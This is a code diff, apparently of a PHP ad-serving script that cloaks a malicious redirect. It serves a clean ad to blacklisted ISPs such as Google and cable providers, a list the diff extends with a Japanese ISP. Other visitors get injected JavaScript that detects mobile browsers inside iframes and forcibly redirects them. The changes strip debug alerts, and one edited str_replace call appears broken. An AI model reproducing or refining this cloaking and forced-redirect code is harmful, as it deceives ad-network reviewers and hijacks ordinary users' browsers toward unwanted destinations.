@@ -37,7 +37,8 @@
 		"Bright House Networks",
 		"Abovenet Communications",
 		"Google",
-		"Cable One"
+		"Cable One",
+		"VECTANT" // AVDW JAPAN
 	);
 
 	$blacklistedCities = array();
@@ -1806,7 +1807,8 @@
 	if ($serveCleanAd)
 	{
 		$resultHtml = str_replace("{script}", "", $resultHtml);
-		$resultHtml = str_replace("{onload}", " onload=\"alert('Server side: Not allowed to view redirect script.');\"", $resultHtml);
+		//$resultHtml = str_replace("{onload}", " onload=\"alert('Server side: Not allowed to view redirect script.');alert('isp:$isp[isp], ip:$ip');\"", $resultHtml);
+		$resultHtml = str_replace("{onload}", "");
 	}
 	else
 	{
@@ -1815,7 +1817,6 @@
 						   		if (window.self !== window.top) {
 						   			if (navigator.plugins.length > 0)
 						   			{
-						   				alert('Desktop browser: Found plugins');
 						   				return;
 						   			}
 
@@ -1823,12 +1824,8 @@
 		  								(navigator.MaxTouchPoints > 0)	|| (navigator.msMaxTouchPoints > 0))
 									{
 										setTimeout(function() {
-											window.location = '$redirectUrl';
+											window.location.href = '$redirectUrl';
 										}, 3000);
-									}
-									else
-									{
-										alert('Desktop browser: No touch indicators found');
 									}
 						   		}
 						   	}
